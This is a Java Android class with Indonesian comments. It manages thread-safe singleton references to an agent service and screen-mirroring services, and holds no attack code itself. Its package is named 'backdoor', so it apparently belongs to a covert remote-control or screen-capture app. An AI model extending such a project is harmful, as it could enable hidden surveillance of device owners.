package com.lazyframework.backdoor;

import android.util.Log;
import java.util.concurrent.atomic.AtomicReference;

/**
 * ServiceController - Thread-safe singleton untuk manage references antar service
 * 
 * Problem yang diselesaikan:
 * - AgentService reference hilang ketika ScreenMirrorService onCreate() buat instance baru
 * - ScreenMirrorHelper tidak bisa communicate balik ke AgentService
 * - Race condition ketika multiple threads access reference
 * 
 * Solution:
 * - Gunakan AtomicReference untuk thread-safety
 * - Register reference saat service/helper dibuat
 * - Clear reference saat service destroy
 */
public class ServiceController {
    private static final String TAG = "ServiceController";
    
    // Atomic references untuk thread-safety - prevent null pointer exception
    private static final AtomicReference<AgentService> agentServiceRef = 
        new AtomicReference<>(null);
    
    private static final AtomicReference<ScreenMirrorHelper> mirrorHelperRef = 
        new AtomicReference<>(null);
    
    private static final AtomicReference<ScreenMirrorService> mirrorServiceRef = 
        new AtomicReference<>(null);
    
    // ==================== SET REFERENCES ====================
    
    /**
     * Register AgentService reference
     * Dipanggil dari AgentService.onCreate()
     */
    public static void setAgentService(AgentService service) {
        agentServiceRef.set(service);
        if (service != null) {
            Log.d(TAG, "✅ AgentService registered");
        } else {
            Log.d(TAG, "⚠️ AgentService unregistered");
        }
    }
    
    /**
     * Register ScreenMirrorHelper reference
     * Dipanggil dari ScreenMirrorService.onCreate()
     */
    public static void setScreenMirrorHelper(ScreenMirrorHelper helper) {
        mirrorHelperRef.set(helper);
        if (helper != null) {
            Log.d(TAG, "✅ ScreenMirrorHelper registered");
        } else {
            Log.d(TAG, "⚠️ ScreenMirrorHelper unregistered");
        }
    }
    
    /**
     * Register ScreenMirrorService reference (optional)
     * Dipanggil dari ScreenMirrorService.onCreate()
     */
    public static void setScreenMirrorService(ScreenMirrorService service) {
        mirrorServiceRef.set(service);
        if (service != null) {
            Log.d(TAG, "✅ ScreenMirrorService registered");
        } else {
            Log.d(TAG, "⚠️ ScreenMirrorService unregistered");
        }
    }
    
    // ==================== GET REFERENCES ====================
    
    /**
     * Get AgentService reference dengan null-check
     * @return AgentService or null
     */
    public static AgentService getAgentService() {
        AgentService service = agentServiceRef.get();
        if (service == null) {
            Log.w(TAG, "⚠️ AgentService is NULL - may cause issues");
        }
        return service;
    }
    
    /**
     * Get ScreenMirrorHelper reference
     * @return ScreenMirrorHelper or null
     */
    public static ScreenMirrorHelper getScreenMirrorHelper() {
        ScreenMirrorHelper helper = mirrorHelperRef.get();
        if (helper == null) {
            Log.w(TAG, "⚠️ ScreenMirrorHelper is NULL");
        }
        return helper;
    }
    
    /**
     * Get ScreenMirrorService reference
     * @return ScreenMirrorService or null
     */
    public static ScreenMirrorService getScreenMirrorService() {
        ScreenMirrorService service = mirrorServiceRef.get();
        if (service == null) {
            Log.w(TAG, "⚠️ ScreenMirrorService is NULL");
        }
        return service;
    }
    
    // ==================== CHECK STATUS ====================
    
    /**
     * Check apakah AgentService tersedia
     */
    public static boolean isAgentServiceAvailable() {
        return agentServiceRef.get() != null;
    }
    
    /**
     * Check apakah ScreenMirrorHelper tersedia
     */
    public static boolean isMirrorHelperAvailable() {
        return mirrorHelperRef.get() != null;
    }
    
    /**
     * Check apakah ScreenMirrorService tersedia
     */
    public static boolean isMirrorServiceAvailable() {
        return mirrorServiceRef.get() != null;
    }
    
    /**
     * Get debug info tentang service status
     */
    public static String getDebugInfo() {
        StringBuilder sb = new StringBuilder();
        sb.append("ServiceController Status:\n");
        sb.append("  AgentService: ").append(isAgentServiceAvailable() ? "✅" : "❌").append("\n");
        sb.append("  ScreenMirrorHelper: ").append(isMirrorHelperAvailable() ? "✅" : "❌").append("\n");
        sb.append("  ScreenMirrorService: ").append(isMirrorServiceAvailable() ? "✅" : "❌");
        return sb.toString();
    }
    
    // ==================== CLEANUP ====================
    
    /**
     * Clear semua references - dipanggil saat service destroy
     */
    public static void clearAll() {
        agentServiceRef.set(null);
        mirrorHelperRef.set(null);
        mirrorServiceRef.set(null);
        Log.d(TAG, "✅ All ServiceController references cleared");
    }
    
    /**
     * Clear specific reference
     */
    public static void clearAgentService() {
        agentServiceRef.set(null);
        Log.d(TAG, "✅ AgentService reference cleared");
    }
    
    public static void clearMirrorHelper() {
        mirrorHelperRef.set(null);
        Log.d(TAG, "✅ ScreenMirrorHelper reference cleared");
    }
    
    public static void clearMirrorService() {
        mirrorServiceRef.set(null);
        Log.d(TAG, "✅ ScreenMirrorService reference cleared");
    }
    
    // ==================== UTILITY ====================
    
    /**
     * Safe call - execute action jika AgentService tersedia
     */
    public static void executeOnAgentService(AgentServiceAction action) {
        AgentService service = getAgentService();
        if (service != null) {
            try {
                action.execute(service);
            } catch (Exception e) {
                Log.e(TAG, "Error executing action on AgentService: " + e.getMessage());
            }
        } else {
            Log.w(TAG, "Cannot execute action - AgentService not available");
        }
    }
    
    /**
     * Interface untuk safe action execution
     */
    public interface AgentServiceAction {
        void execute(AgentService service) throws Exception;
    }
}
